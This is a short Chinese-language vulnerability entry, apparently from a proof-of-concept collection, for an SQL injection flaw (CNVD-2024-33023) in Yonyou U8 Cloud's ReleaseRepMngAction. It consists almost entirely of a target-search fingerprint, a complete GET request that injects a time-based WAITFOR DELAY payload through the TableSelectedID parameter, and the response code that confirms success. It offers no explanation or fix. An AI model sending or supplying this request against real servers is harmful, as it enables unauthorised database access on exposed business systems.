# 用友U8CloudReleaseRepMngAction存在SQL注入漏洞(CNVD-2024-33023)

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1`
- **响应特征**：200